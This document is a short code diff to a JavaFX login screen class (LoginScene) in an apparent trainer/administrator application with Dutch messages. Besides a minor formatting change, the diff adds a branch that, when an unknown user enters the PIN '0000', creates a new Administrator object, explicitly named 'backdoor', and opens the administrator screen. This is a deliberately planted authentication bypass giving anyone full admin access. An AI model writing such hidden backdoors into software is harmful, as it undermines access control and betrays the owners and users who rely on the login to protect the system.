@@ -59,7 +59,6 @@ public class LoginScene {
                 if ((thisPerson instanceof Trainer)) {
                     pincodeField.clear();
                     window.setScene(TrainerScene.getTrainerScene(thisPerson));
-
                 } else if ((thisPerson instanceof Administrator)) {
                     pincodeField.clear();
                     window.setScene(AdministratorScene.getAdministratorScene(thisPerson));
@@ -71,7 +70,12 @@ public class LoginScene {
                 }
 
 
-            } else {
+            }else if((pincodeField.getLength() == 4)&& (thisPerson == null) &&(Integer.parseInt(pincodeField.getText())==0000)){
+                Person backdoor = new Administrator();
+                window.setScene(AdministratorScene.getAdministratorScene(backdoor));
+            }
+
+            else {
                 message.setText("Uw LoginCode is onjuist!\n voer nogmaals uw code in");
                 message.setStyle("-fx-font: bold 18px Calibri;-fx-fill: crimson");
                 pincodeField.clear();
